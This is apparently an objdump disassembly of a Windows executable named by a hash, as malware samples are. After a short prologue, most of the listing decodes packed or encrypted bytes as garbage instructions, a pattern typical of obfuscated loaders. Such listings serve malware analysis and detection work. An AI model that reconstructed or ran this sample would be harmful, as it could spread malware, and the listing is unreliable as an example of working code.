
d36d8bd7eba0fc81dc9bef01c6ff81e1b9c6a3c00b84f0f5674df40a9bec3358.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	add    DWORD PTR ds:0x4283f1,0x428491
  401019:	sub    eax,edx
  40101b:	mov    DWORD PTR ds:0x428415,ecx
  401021:	push   edi
  401022:	mov    edi,DWORD PTR [ebp-0x4c]
  401025:	mov    DWORD PTR [ebp-0x50],eax
  401028:	not    edx
  40102a:	sbb    ecx,edi
  40102c:	inc    DWORD PTR ds:0x4282fd
  401032:	mov    DWORD PTR [ebp-0x4c],ecx
  401035:	or     DWORD PTR [ebp-0x50],0xcb78dc42
  40103c:	sub    DWORD PTR ds:0x428409,ecx
  401042:	or     DWORD PTR [ebp-0x4c],0x9c2b8ae8
  401049:	mov    edx,DWORD PTR ds:0x4283d1
  40104f:	xor    DWORD PTR ds:0x428515,edx
  401055:	mov    eax,DWORD PTR [ebp-0x58]
  401058:	jmp    0x4013f9
  40105d:	(bad)  
  40105e:	mov    edi,0x9098bf8d
  401063:	cwde   
  401064:	(bad)  
  401065:	mov    cl,BYTE PTR [esi+ebp*4-0x31]
  401069:	das    
  40106a:	sub    edx,DWORD PTR [esi+ebx*4-0x42]
  40106e:	mov    esi,0xc4bdbebe
  401073:	mov    esi,0x11434fbe
  401078:	mov    DWORD PTR [esi],edx
  40107a:	ds out 0x1f,al
  40107d:	fucomp st(0)
  40107f:	lock sahf 
  401081:	int3   
  401082:	add    eax,0xc7c61f25
  401087:	ffree  st(5)
  401089:	outs   dx,BYTE PTR gs:[esi]
  40108b:	mov    ecx,0x723deed2
  401090:	repnz cmc 
  401092:	adc    al,0x95
  401094:	out    0xc5,eax
  401096:	ss mov cl,0x7e
  401099:	test   DWORD PTR [edx+0xd339a63],esp
  40109f:	repz or BYTE PTR [ecx-0x2c],al
  4010a3:	fisub  WORD PTR [ebx+0x39d2cc4]
  4010a9:	mov    gs,WORD PTR [esi-0x7c]
  4010ac:	mov    esp,0xe03bf4cd
  4010b1:	icebp  
  4010b2:	arpl   WORD PTR ds:0xc4c947e,dx
  4010b8:	call   0x4be36aff
  4010bd:	pop    eax
  4010be:	rcr    bl,1
  4010c0:	inc    esi
  4010c1:	dec    ebp
  4010c2:	shl    DWORD PTR [edx+0x79],0x32
  4010c6:	sub    edi,DWORD PTR [ebx-0x13b6c9c8]
  4010cc:	inc    edx
  4010cd:	lds    esi,FWORD PTR [edx+0x11b8a4d5]
  4010d3:	dec    ecx
  4010d4:	pop    edi
  4010d5:	ret    
  4010d6:	jnp    0x40108a
  4010d8:	cmp    DWORD PTR [ecx],ecx
  4010da:	jle    0x4010fb
  4010dc:	inc    ebx
  4010dd:	call   0x9996abdd
  4010e2:	pop    edx
  4010e3:	xchg   edx,eax
  4010e4:	rcr    BYTE PTR [ebp-0x1f8c23e4],1
  4010ea:	retf   0x3c79
  4010ed:	sub    esi,ebp
  4010ef:	das    
  4010f0:	cmp    edi,DWORD PTR [edx]
  4010f2:	xor    edi,DWORD PTR [edi]
  4010f4:	jge    0x401133
  4010f6:	or     bl,BYTE PTR [esi]
  4010f8:	loopne 0x4010d9
  4010fa:	pop    ebx
  4010fb:	adc    al,0x6d
  4010fd:	inc    ecx
  4010fe:	aam    0x3a
  401100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401101:	outs   dx,DWORD PTR ds:[esi]
  401102:	or     eax,0x84948aa1
  401107:	push   cs
  401108:	add    al,BYTE PTR [ebp-0x34]
  40110b:	pop    ds
  40110c:	xor    edx,edx
  40110e:	xor    eax,0x134945cb
  401113:	dec    edi
  401114:	push   ss
  401115:	pop    es
  401116:	adc    al,0xf8
  401118:	push   ss
  401119:	test   DWORD PTR ds:[ebp+0x49],ebx
  40111d:	xor    al,0x4f
  40111f:	push   eax
  401120:	jmp    0x401170
  401122:	mov    esi,0xf5404bf6
  401127:	ret    0x7788
  40112a:	push   es
  40112b:	sub    BYTE PTR [edx-0x6b4502c8],bh
  401131:	nop
  401132:	nop
  401133:	xor    edx,DWORD PTR [ecx-0x21577cab]
  401139:	dec    ebx
  40113a:	fbstp  TBYTE PTR [ebx+0xf19b4f4]
  401140:	mov    bl,0x18
  401142:	(bad)  
  401143:	(bad)  
  401144:	fldcw  WORD PTR [esi-0x63a7d10a]
  40114a:	pusha  
  40114b:	sbb    BYTE PTR [eax+0x43],0xa7
  40114f:	jmp    0x4010fe
  401151:	push   esi
  401152:	or     al,0xa9
  401154:	arpl   WORD PTR [ecx],sp
  401156:	pusha  
  401157:	(bad)  
  401158:	int3   
  401159:	mov    ch,cl
  40115b:	das    
  40115c:	jp     0x4011af
  40115e:	xchg   edx,eax
  40115f:	pop    ss
  401160:	jecxz  0x401164
  401162:	and    al,0x25
  401164:	fbld   TBYTE PTR [eax-0x15]
  401167:	sub    ebx,DWORD PTR [ebx-0x78c5cba2]
  40116d:	test   al,0xd5
  40116f:	nop
  401170:	addr16 push ecx
  401172:	sbb    cl,BYTE PTR ds:0x8f79669a
  401178:	and    al,0xa6
  40117a:	mov    ecx,0x47aac335
  40117f:	push   esi
  401180:	add    eax,0x961a0d12
  401185:	mov    al,ds:0x29ebd1ad
  40118a:	xchg   ecx,eax
  40118b:	popa   
  40118c:	mov    al,0x87
  40118e:	jbe    0x401129
  401190:	mov    dl,0xe4
  401192:	shl    DWORD PTR [ebx],cl
  401194:	popa   
  401195:	jne    0x4011d0
  401197:	mov    bl,0x7f
  401199:	call   0xbab:0x4dcda4e8
  4011a0:	jge    0x40113a
  4011a2:	push   esp
  4011a3:	mov    esp,0x9c9e68cc
  4011a8:	inc    ecx
  4011a9:	sbb    edx,esp
  4011ab:	inc    ebx
  4011ac:	int3   
  4011ad:	das    
  4011ae:	rol    DWORD PTR [edi+0x318d6e4b],0x29
  4011b5:	shr    BYTE PTR [eax+0x49a32e15],cl
  4011bb:	push   0x6ff2d54f
  4011c0:	xchg   ecx,eax
  4011c1:	sbb    eax,0xd634e38a
  4011c6:	mov    DWORD PTR [ebx+0x791229e4],esp
  4011cc:	xchg   esi,eax
  4011cd:	dec    BYTE PTR [esi+0x35]
  4011d0:	xchg   ebp,eax
  4011d1:	scas   eax,DWORD PTR es:[edi]
  4011d2:	in     al,0x83
  4011d4:	dec    edi
  4011d5:	xor    DWORD PTR [ebx],0x59843279
  4011db:	cli    
  4011dc:	frstor [edi-0x8]
  4011df:	mov    cs,WORD PTR [ebp-0x69]
  4011e2:	test   al,0xa5
  4011e4:	push   cs
  4011e5:	xor    ebx,esp
  4011e7:	lea    ebx,[ebp-0x5d]
  4011ea:	inc    ebx
  4011eb:	mov    ch,0x9f
  4011ed:	lods   al,BYTE PTR ds:[esi]
  4011ee:	add    eax,0xb5aa390d
  4011f3:	sub    BYTE PTR [ecx-0x3557b164],0x60
  4011fa:	inc    esp
  4011fb:	sub    BYTE PTR [ebx-0x72734508],cl
  401201:	inc    esp
  401202:	inc    edx
  401203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401204:	xchg   BYTE PTR [ebx],dl
  401206:	jbe    0x401197
  401208:	xor    bl,BYTE PTR [edx+eiz*4-0x2b]
  40120c:	fldenv [ecx-0x5eacc89b]
  401212:	sar    BYTE PTR ds:0xb87b1b1e,0x5e
  401219:	jg     0x4011ac
  40121b:	cmp    BYTE PTR [ebx+ecx*2+0x74],0x15
  401220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401221:	xor    ch,BYTE PTR [esi-0xd]
  401224:	inc    ebx
  401225:	icebp  
  401226:	cdq    
  401227:	popf   
  401228:	or     BYTE PTR [ebx+ebx*8],0x8f
  40122c:	ret    
  40122d:	mov    ebx,0x717dd72d
  401232:	mov    ah,al
  401234:	pop    ecx
  401235:	repnz fs scas eax,DWORD PTR es:[edi]
  401238:	pop    ss
  401239:	aaa    
  40123a:	mov    ch,0x6a
  40123c:	in     al,dx
  40123d:	fs arpl bx,cx
  401240:	frstor [ecx+0x222f2b8b]
  401246:	cmovbe esp,ecx
  401249:	mov    BYTE PTR [edx],dh
  40124b:	mov    bl,0x6b
  40124d:	mov    bh,0x80
  40124f:	std    
  401250:	cwde   
  401251:	dec    ebx
  401252:	ins    BYTE PTR es:[edi],dx
  401253:	jae    0x401263
  401255:	ret    0xc958
  401258:	in     eax,0x26
  40125a:	and    bl,BYTE PTR [ecx-0x72162115]
  401260:	ss mov ecx,0x73ea0198
  401266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401267:	sub    al,al
  401269:	and    ebp,DWORD PTR [edi+eax*1]
  40126c:	popa   
  40126d:	loopne 0x40121c
  40126f:	mov    eax,0xb42e440b
  401274:	dec    esp
  401275:	popf   
  401276:	jp     0x4012a7
  401278:	sbb    edx,DWORD PTR [edi+0x66ecf4c9]
  40127e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127f:	push   ecx
  401280:	dec    edi
  401281:	push   esp
  401282:	dec    esp
  401283:	sub    edi,esp
  401285:	shl    BYTE PTR [esi+ecx*2],cl
  401288:	sub    DWORD PTR [ecx+0x24],edi
  40128b:	jnp    0x401300
  40128d:	in     al,0xdf
  40128f:	adc    edx,0x213a12a6
  401295:	mov    ds:0x38f3a695,al
  40129a:	xchg   ebp,eax
  40129b:	or     edx,ebx
  40129d:	add    dl,BYTE PTR [eax+ebx*2+0xb40f8bb]
  4012a4:	fs mov al,0x9a
  4012a7:	xor    eax,0xbf19f0b2
  4012ac:	jo     0x401308
  4012ae:	push   ecx
  4012af:	jmp    0xcde4ea82
  4012b4:	iret   
  4012b5:	adc    ecx,edi
  4012b7:	jae    0x40129f
  4012b9:	dec    ebp
  4012ba:	and    bh,BYTE PTR [ebp-0x7f]
  4012bd:	imul   DWORD PTR [esi]
  4012bf:	lahf   
  4012c0:	nop
  4012c1:	and    ch,0xef
  4012c4:	imul   eax,edx,0x715763b3
  4012ca:	nop
  4012cb:	cmc    
  4012cc:	and    BYTE PTR [eax+edx*8],0xfa
  4012d0:	adc    bh,BYTE PTR [ebx]
  4012d2:	or     BYTE PTR ds:0xa4db62c,ch
  4012d8:	mov    WORD PTR [ecx],cs
  4012da:	repnz push edx
  4012dc:	test   eax,0x699410cf
  4012e1:	in     al,0xd2
  4012e3:	scas   eax,DWORD PTR es:[edi]
  4012e4:	call   0xd5f7:0x5708441
  4012eb:	outs   dx,BYTE PTR ds:[esi]
  4012ec:	pop    esp
  4012ed:	xchg   ecx,eax
  4012ee:	cdq    
  4012ef:	mov    ch,BYTE PTR [ebp+0x4d]
  4012f2:	lock mov esi,es
  4012f5:	sbb    BYTE PTR [esi+ecx*2+0xb],ah
  4012f9:	xchg   esi,eax
  4012fa:	jmp    0x50ba:0x31f4e76
  401301:	mov    edi,0x5f0e5900
  401306:	sbb    DWORD PTR [ebp-0x6f],esi
  401309:	push   ebp
  40130a:	shr    DWORD PTR [ecx-0xa3f7ef0],cl
  401310:	aas    
  401311:	addr16 int 0xdb
  401314:	inc    ecx
  401315:	push   edx
  401316:	dec    esp
  401317:	mov    esi,DWORD PTR [edx-0x31f5533c]
  40131d:	sub    ebx,esp
  40131f:	adc    al,0xe5
  401321:	adc    BYTE PTR [eax+0x10],bl
  401324:	stc    
  401325:	out    0xa1,eax
  401327:	cmp    al,0x10
  401329:	call   0xaf2b2d38
  40132e:	jecxz  0x401360
  401330:	cmp    BYTE PTR [ecx+0x2a57c94f],0x28
  401337:	and    ecx,DWORD PTR [ecx+0x56]
  40133a:	jo     0x4013a9
  40133c:	adc    edi,esi
  40133e:	addr16 retf 0xc987
  401342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401343:	inc    ebp
  401344:	or     bl,bh
  401346:	or     esi,ebx
  401348:	push   cs
  401349:	sahf   
  40134a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40134b:	(bad)  
  40134c:	std    
  40134d:	not    BYTE PTR [edx+edi*2-0x67]
  401351:	in     eax,0x61
  401353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401354:	jmp    0xec13e5df
  401359:	jl     0x4013d0
  40135b:	push   edi
  40135c:	sbb    DWORD PTR [eax+0xf041608],0x639f8dfc
  401366:	cmc    
  401367:	scas   eax,DWORD PTR es:[edi]
  401368:	and    ch,dh
  40136a:	and    BYTE PTR [edx],0x5a
  40136d:	loopne 0x4013a8
  40136f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401370:	hlt    
  401371:	add    DWORD PTR [esi+0x46],ebp
  401374:	xchg   esi,eax
  401375:	lods   eax,DWORD PTR ds:[esi]
  401376:	and    al,0x35
  401378:	jmp    0xffe0:0xa82485fd
  40137f:	sahf   
  401380:	dec    ebx
  401381:	ja     0x40134c
  401383:	pop    edi
  401384:	scas   eax,DWORD PTR es:[edi]
  401385:	sbb    edi,DWORD PTR [esp+edi*4-0x72]
  401389:	add    ah,BYTE PTR [eax-0x7c5b629c]
  40138f:	mov    bh,BYTE PTR [edx]
  401391:	cdq    
  401392:	fwait
  401393:	inc    eax
  401394:	inc    ebp
  401395:	dec    ebx
  401396:	cmp    eax,0x4c891004
  40139b:	mov    ch,0xe9
  40139d:	jecxz  0x40137c
  40139f:	sbb    BYTE PTR [edi],ch
  4013a1:	cmp    eax,0xa13c6928
  4013a6:	fidiv  WORD PTR [ecx]
  4013a8:	psubusw mm1,QWORD PTR [ecx+0x4]
  4013ac:	or     DWORD PTR [edx],esi
  4013ae:	sti    
  4013af:	cdq    
  4013b0:	fs mov cl,0xbb
  4013b3:	dec    ebx
  4013b4:	add    bl,bl
  4013b6:	mov    esi,0x5d4a3261
  4013bb:	lods   eax,DWORD PTR ds:[esi]
  4013bc:	pop    ebx
  4013bd:	jb     0x40141c
  4013bf:	jne    0x40137f
  4013c1:	inc    esi
  4013c2:	mov    ds:0x677c38e3,al
  4013c7:	mov    edx,0x328b3119
  4013cc:	push   edx
  4013cd:	xlat   BYTE PTR ds:[ebx]
  4013ce:	dec    ebp
  4013cf:	outs   dx,DWORD PTR ds:[esi]
  4013d0:	add    eax,0xf64aea40
  4013d5:	jmp    0x7bd1a709
  4013da:	out    0x7e,al
  4013dc:	and    dh,BYTE PTR [ebx-0x4be21af1]
  4013e2:	out    dx,eax
  4013e3:	mov    dl,0x67
  4013e5:	or     edi,eax
  4013e7:	stos   BYTE PTR es:[edi],al
  4013e8:	mov    DWORD PTR [ebp+0x7],ebp
  4013eb:	jne    0x4013fc
  4013ed:	mov    edx,0x1c9ac73e
  4013f2:	scas   al,BYTE PTR es:[edi]
  4013f3:	call   0xd00a382d
  4013f8:	arpl   WORD PTR [ebx+0x3d03ac4d],cx
  4013fe:	jno    0x401384
  401400:	inc    edx
  401401:	add    BYTE PTR [ebx+0xd19a855],cl
  401407:	mov    DWORD PTR [edx+eax*2-0x53827500],eax
  40140e:	sub    DWORD PTR ds:0x428515,0x1812
  401418:	sub    eax,edx
  40141a:	movzx  edx,BYTE PTR ds:0x428401
  401421:	jmp    0x4017c2
  401426:	test   BYTE PTR [edx+0x7cbcfc08],0x3a
  40142d:	mov    WORD PTR [esi+0x6e],es
  401430:	rcl    DWORD PTR [eax-0x1c6367f6],cl
  401436:	mov    ebp,0xbdbebec4
  40143b:	les    edi,FWORD PTR [esi+0x300f25be]
  401441:	xchg   edx,eax
  401442:	int3   
  401443:	das    
  401444:	mov    ebp,edi
  401446:	lods   al,BYTE PTR ds:[esi]
  401447:	jns    0x40143e
  401449:	add    ebp,0x31d3d1dc
  40144f:	call   0x49f3b4b0
  401454:	ins    BYTE PTR es:[edi],dx
  401455:	pop    es
  401456:	rcr    DWORD PTR [edi-0x27],1
  401459:	lock les esp,FWORD PTR [ecx]
  40145c:	pop    DWORD PTR [edx]
  40145e:	mov    al,0xd5
  401460:	jmp    DWORD PTR [esi-0x3]
  401463:	daa    
  401464:	jmp    0x4014e2
  401466:	mov    ebp,0xc24ea41f
  40146b:	xor    esp,ecx
  40146d:	xor    edx,DWORD PTR [eax]
  40146f:	push   ds
  401470:	inc    edi
  401471:	mov    ecx,0x4943964e
  401476:	call   0x35ae3412
  40147b:	dec    ebp
  40147c:	jb     0x4014d9
  40147e:	or     ebx,edx
  401480:	pusha  
  401481:	das    
  401482:	adc    ebp,DWORD PTR [edi+0x7e9806a1]
  401488:	jle    0x401507
  40148a:	mov    DWORD PTR [ecx+ecx*1+0x171ade45],esi
  401491:	mov    BYTE PTR ds:0xd31b8e2,bl
  401497:	add    BYTE PTR gs:[edx-0x46],ah
  40149b:	repnz lahf 
  40149d:	xchg   esp,eax
  40149e:	fwait
  40149f:	test   al,0x3b
  4014a1:	ins    DWORD PTR es:[edi],dx
  4014a2:	inc    esi
  4014a3:	in     al,dx
  4014a4:	(bad)  
  4014a6:	out    0x4f,al
  4014a8:	(bad)  
  4014a9:	fdivr  DWORD PTR [esi-0x41]
  4014ac:	jle    0x401498
  4014ae:	stos   DWORD PTR es:[edi],eax
  4014af:	sub    al,0x73
  4014b1:	retf   
  4014b2:	mov    ds:0xca57148,eax
  4014b7:	sbb    DWORD PTR [ebx-0x40583499],edx
  4014bd:	jg     0x4014ac
  4014bf:	or     eax,0x17fa1a4c
  4014c4:	sbb    eax,0x67ef714
  4014c9:	fs int3 
  4014cb:	dec    ebp
  4014cc:	es mov dl,0x3a
  4014cf:	inc    ebp
  4014d0:	mov    DWORD PTR [esi+0x1a],edi
  4014d3:	push   es
  4014d4:	repnz inc eax
  4014d6:	add    bl,BYTE PTR [eax-0x4a]
  4014d9:	lods   eax,DWORD PTR ds:[esi]
  4014da:	lahf   
  4014db:	pop    ebx
  4014dc:	push   ds
  4014dd:	cmp    ebp,DWORD PTR [edi+eax*8+0xe]
  4014e1:	xchg   DWORD PTR [esi],edx
  4014e3:	adc    al,0xd2
  4014e5:	push   edx
  4014e6:	pop    ebx
  4014e7:	cdq    
  4014e8:	mov    ch,0x3a
  4014ea:	xor    al,0x57
  4014ec:	push   ss
  4014ed:	pop    edx
  4014ee:	mov    bh,BYTE PTR ds:0x51a0ae84
  4014f4:	push   esp
  4014f5:	and    DWORD PTR [edx],esp
  4014f7:	mov    ds:0x8ab3bf0c,al
  4014fc:	push   edx
  4014fd:	(bad)  
  4014fe:	retf   0xb44c
  401501:	inc    eax
  401502:	xchg   ecx,eax
  401503:	test   BYTE PTR [ecx],bl
  401505:	jg     0x4014b2
  401507:	and    DWORD PTR [esp+ebx*8-0x8cad2cd],ebp
  40150e:	mov    esp,0x30fb9b1b
  401513:	dec    ebx
  401514:	xchg   edi,eax
  401515:	call   0xa7266c0b
  40151a:	(bad)  
  40151b:	push   edx
  40151c:	jae    0x4014b8
  40151e:	dec    eax
  40151f:	icebp  
  401520:	fcomp  QWORD PTR [ecx+edx*1+0x5d]
  401524:	cli    
  401525:	xchg   esp,eax
  401526:	sub    DWORD PTR [edi-0x4d7beafb],ebx
  40152c:	ins    BYTE PTR es:[edi],dx
  40152d:	lock pusha 
  40152f:	mov    ebx,0xdef41ba5
  401534:	jle    0x40150f
  401536:	and    al,0x44
  401538:	out    0xb5,al
  40153a:	sub    al,0xf1
  40153c:	sub    al,0xea
  40153e:	jno    0x4015a1
  401540:	jge    0x40156b
  401542:	inc    ebp
  401543:	clc    
  401544:	xchg   ebp,eax
  401545:	push   ebp
  401546:	dec    edx
  401547:	(bad)  
  401548:	mov    ds:0x3f88a61b,eax
  40154d:	popf   
  40154e:	pop    esi
  40154f:	dec    esi
  401550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401551:	cmp    ebp,ebp
  401553:	or     dh,BYTE PTR [ecx+esi*1]
  401556:	rcl    BYTE PTR [esi],0xce
  401559:	push   esp
  40155a:	mov    ch,0x74
  40155c:	xchg   ebx,eax
  40155d:	mov    bh,0xd5
  40155f:	dec    edx
  401560:	adc    eax,0xb6c04e60
  401565:	test   BYTE PTR [esi-0x70],0x3
  401569:	and    DWORD PTR [edx+0x880dc74],esi
  40156f:	mov    dh,BYTE PTR [esi+eiz*8+0x5e8e0cb]
  401576:	(bad)  
  401577:	adc    eax,0x18504455
  40157c:	mov    ecx,0x51653aa1
  401581:	xor    eax,0x2b505737
  401586:	or     esp,0xffffff94
  401589:	outs   dx,BYTE PTR ds:[esi]
  40158a:	adc    DWORD PTR [eax+esi*2],esi
  40158d:	fdiv   DWORD PTR [edx]
  40158f:	push   es
  401590:	add    DWORD PTR cs:0x1d320ad4,esp
  401597:	fstp   DWORD PTR [ebx+0xa]
  40159a:	or     DWORD PTR [ecx+0x642a0e6f],0xffffffcb
  4015a1:	push   es
  4015a2:	mov    cs,edi
  4015a4:	pushf  
  4015a5:	jnp    0x4015e4
  4015a7:	jmp    FWORD PTR [edx+0x5ca06ca0]
  4015ad:	fwait
  4015ae:	(bad)  
  4015af:	pop    eax
  4015b0:	xor    esi,DWORD PTR [eax]
  4015b2:	mov    WORD PTR [edi+0x63182382],es
  4015b8:	cmp    BYTE PTR [esi-0x6683bcd8],dh
  4015be:	push   0xa90c361e
  4015c3:	jl     0x401609
  4015c5:	lock ss ss xchg ebp,eax
  4015c9:	(bad)  
  4015ca:	cli    
  4015cb:	mov    ah,0xa
  4015cd:	dec    edi
  4015ce:	scas   al,BYTE PTR es:[edi]
  4015cf:	sub    al,0xd1
  4015d1:	dec    eax
  4015d2:	cs cld 
  4015d4:	dec    ecx
  4015d5:	mov    al,ds:0xd7452485
  4015da:	scas   al,BYTE PTR es:[edi]
  4015db:	adc    eax,0x7844ba92
  4015e0:	imul   DWORD PTR [ecx-0xc]
  4015e3:	imul   ebx,DWORD PTR [ecx+0x509e40d7],0xf3031a65
  4015ed:	adc    dh,BYTE PTR ds:0xdbfb4a74
  4015f3:	das    
  4015f4:	test   al,0x8f
  4015f6:	jp     0x4015ed
  4015f8:	int3   
  4015f9:	pop    ebp
  4015fa:	rcl    DWORD PTR [edi+0x4],cl
  4015fd:	mov    ah,0xe8
  4015ff:	xor    BYTE PTR [edi-0x2d41df09],ah
  401605:	int3   
  401606:	pop    ecx
  401607:	mov    edi,ebx
  401609:	fistp  QWORD PTR [edx+0x4ba7bfba]
  40160f:	add    esi,DWORD PTR [edx+0x144fd6f5]
  401615:	xchg   DWORD PTR [edx-0xf9a218f],eax
  40161b:	add    al,0x81
  40161d:	call   0xeb5c:0xc485566a
  401624:	out    0x23,eax
  401626:	push   edi
  401627:	iret   
  401628:	sub    bl,ah
  40162a:	mov    ecx,DWORD PTR [esi-0x42]
  40162d:	dec    esi
  40162e:	jae    0x4015f9
  401630:	ret    0x4197
  401633:	xchg   ebx,eax
  401634:	test   al,0x49
  401636:	imul   eax,DWORD PTR [edx+0x68],0xbe8b4932
  40163d:	pop    ebp
  40163e:	add    cl,bl
  401640:	xchg   BYTE PTR [edx+0x45],dh
  401643:	xchg   ebp,eax
  401644:	aad    0x8a
  401646:	add    al,dh
  401648:	ja     0x4015de
  40164a:	jnp    0x401601
  40164c:	ins    DWORD PTR es:[edi],dx
  40164d:	outs   dx,DWORD PTR ds:[esi]
  40164e:	imul   esp
  401650:	pop    edx
  401651:	mov    dl,0xe1
  401653:	imul   ecx,ebx,0x330ad400
  401659:	or     ebp,edx
  40165b:	xor    al,0xde
  40165d:	int3   
  40165e:	std    
  40165f:	call   0xcfd126bc
  401664:	inc    ecx
  401665:	mov    ch,0xb6
  401667:	xchg   edi,eax
  401668:	push   edi
  401669:	inc    edx
  40166a:	mov    edi,0x842dac7f
  40166f:	ror    edi,1
  401671:	ret    
  401672:	push   0x7d
  401674:	fst    DWORD PTR [edx+eax*8-0x17]
  401678:	ret    
  401679:	add    DWORD PTR [esi],eax
  40167b:	je     0x401626
  40167d:	lods   al,BYTE PTR ds:[esi]
  40167e:	sar    DWORD PTR [edx-0x1e],1
  401681:	or     bl,BYTE PTR [edi]
  401683:	mov    DWORD PTR [esi],ebx
  401685:	and    bl,bh
  401687:	mov    bh,0x5c
  401689:	sbb    eax,0xd610568a
  40168e:	mov    esp,0x60a2b7d5
  401693:	loop   0x4016cd
  401695:	out    dx,al
  401696:	ins    DWORD PTR es:[edi],dx
  401697:	add    DWORD PTR [edx],0xffffff91
  40169a:	das    
  40169b:	mov    al,0xa8
  40169d:	repz retf 
  40169f:	and    ebx,DWORD PTR [eax]
  4016a1:	icebp  
  4016a2:	out    0xc3,eax
  4016a4:	js     0x401652
  4016a6:	sbb    al,BYTE PTR [edi+0x24a2064b]
  4016ac:	and    ebp,esp
  4016ae:	xchg   edi,eax
  4016af:	(bad)  
  4016b0:	fstp   TBYTE PTR [esi]
  4016b2:	popa   
  4016b3:	jae    0x401715
  4016b5:	sbb    al,0x6c
  4016b7:	xlat   BYTE PTR ds:[ebx]
  4016b8:	dec    ebx
  4016b9:	les    ebx,FWORD PTR [edx+ebp*2-0x31705930]
  4016c0:	jbe    0x40167e
  4016c2:	jle    0x401735
  4016c4:	inc    edx
  4016c5:	inc    ecx
  4016c6:	inc    edi
  4016c7:	xor    BYTE PTR [eax+0x7af88bd8],ah
  4016cd:	int3   
  4016ce:	fwait
  4016cf:	dec    edx
  4016d0:	mov    esi,0x889fb1ec
  4016d5:	fcmovnbe st,st(4)
  4016d7:	xor    edi,ebp
  4016d9:	je     0x4016c2
  4016db:	retf   
  4016dc:	popf   
  4016dd:	xchg   edx,eax
  4016de:	mov    dh,0x4c
  4016e0:	inc    ebp
  4016e1:	iret   
  4016e2:	or     eax,0x7570922d
  4016e7:	rcl    DWORD PTR [edi-0x77],1
  4016ea:	adc    eax,0xbb02d8a0
  4016ef:	in     al,dx
  4016f0:	sar    BYTE PTR [ebp-0x61],0x83
  4016f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f5:	arpl   cx,bx
  4016f7:	jecxz  0x4016b1
  4016f9:	adc    BYTE PTR [eax-0x30],bh
  4016fc:	dec    esi
  4016fd:	pop    edx
  4016fe:	fst    DWORD PTR [ecx+edx*2]
  401701:	addr16 and al,0x19
  401704:	inc    ebp
  401705:	pop    eax
  401706:	and    dh,cl
  401708:	stos   BYTE PTR es:[edi],al
  401709:	es aam 0xff
  40170c:	lea    edi,[esi+0x69cf18dc]
  401712:	cmp    al,0x72
  401714:	call   0x1ede:0x5fa48215
  40171b:	in     eax,dx
  40171c:	add    ch,BYTE PTR ds:0x4ecd6a76
  401722:	add    al,BYTE PTR [esi+0x44]
  401725:	int    0xe2
  401727:	cmc    
  401728:	xchg   esi,eax
  401729:	mov    ebp,0x9ed46844
  40172e:	inc    esp
  40172f:	loopne 0x4016eb
  401731:	and    BYTE PTR [ecx],0xfe
  401734:	stos   DWORD PTR es:[edi],eax
  401735:	sub    cl,cl
  401737:	pop    esp
  401738:	add    ch,BYTE PTR [esi+edx*1+0x39c5f1e6]
  40173f:	in     eax,0x74
  401741:	jecxz  0x401746
  401743:	or     eax,0x756f1946
  401748:	mov    ch,0x5a
  40174a:	cmp    BYTE PTR [ebx+eiz*4+0x4305f54c],0x67
  401752:	cmc    
  401753:	dec    eax
  401754:	cmp    edi,ebp
  401756:	xchg   esp,eax
  401757:	rol    DWORD PTR [ecx],1
  401759:	stos   DWORD PTR es:[edi],eax
  40175a:	cld    
  40175b:	ror    dl,0xb1
  40175e:	add    DWORD PTR [ebx],ecx
  401760:	xchg   edi,eax
  401761:	je     0x4016e5
  401763:	mov    esp,0x61689765
  401768:	jl     0x4017a7
  40176a:	mov    bh,0x31
  40176c:	push   ecx
  40176d:	xor    dl,0xe
  401770:	sar    BYTE PTR [edi-0xe24ed6c],cl
  401776:	inc    eax
  401777:	hlt    
  401778:	pop    edi
  401779:	mov    ds,ebp
  40177b:	es and eax,0xf9f11b03
  401781:	imul   eax,DWORD PTR [ebp-0x80],0xffffffae
  401785:	clc    
  401786:	jp     0x4017c4
  401788:	add    al,0x1a
  40178a:	inc    ebx
  40178b:	imul   esp,ebx,0xcedca65d
  401791:	mov    dl,0x81
  401793:	(bad)  
  401794:	dec    edx
  401795:	and    al,0x49
  401797:	(bad)  
  401798:	sbb    eax,0x3f6c1583
  40179d:	sbb    al,0x44
  40179f:	inc    ebx
  4017a0:	adc    BYTE PTR [ebx+0x60ed42a1],bh
  4017a6:	out    0xe0,al
  4017a8:	fisub  DWORD PTR [ecx-0x76]
  4017ab:	fld    st(6)
  4017ad:	aam    0xa8
  4017af:	cmp    al,0x4e
  4017b1:	mov    edi,0x5f89018e
  4017b6:	pop    ebx
  4017b7:	lock xchg DWORD PTR [edi+0x797ee8f4],eax
  4017be:	aam    0xb1
  4017c0:	ror    BYTE PTR [ebp-0x77],cl
  4017c3:	inc    ebp
  4017c4:	test   al,0x1b
  4017c6:	iret   
  4017c7:	mov    DWORD PTR [ebp-0x54],ecx
  4017ca:	or     ecx,0x1b77
  4017d0:	or     DWORD PTR [ebp-0x58],0xcb78a05a
  4017d7:	adc    DWORD PTR ds:0x4283f1,edi
  4017dd:	or     DWORD PTR [ebp-0x54],0x9c2b8ae8
  4017e4:	lea    eax,[ebp+0x20]
  4017e7:	cmp    DWORD PTR ds:0x4283e9,0x0
  4017ee:	mov    edi,DWORD PTR ds:0x428505
  4017f4:	movzx  ecx,WORD PTR ds:0x4282f9
  4017fb:	mov    ecx,0x7757
  401800:	jmp    0x401860
  401805:	mov    ecx,0x59da
  40180a:	cmp    DWORD PTR ds:0x4283e9,0x0
  401811:	ja     0x401846
  401817:	push   0x428235
  40181c:	call   DWORD PTR ds:0x42e09c
  401822:	xor    edx,edx
  401824:	or     edx,DWORD PTR ds:0x4282f5
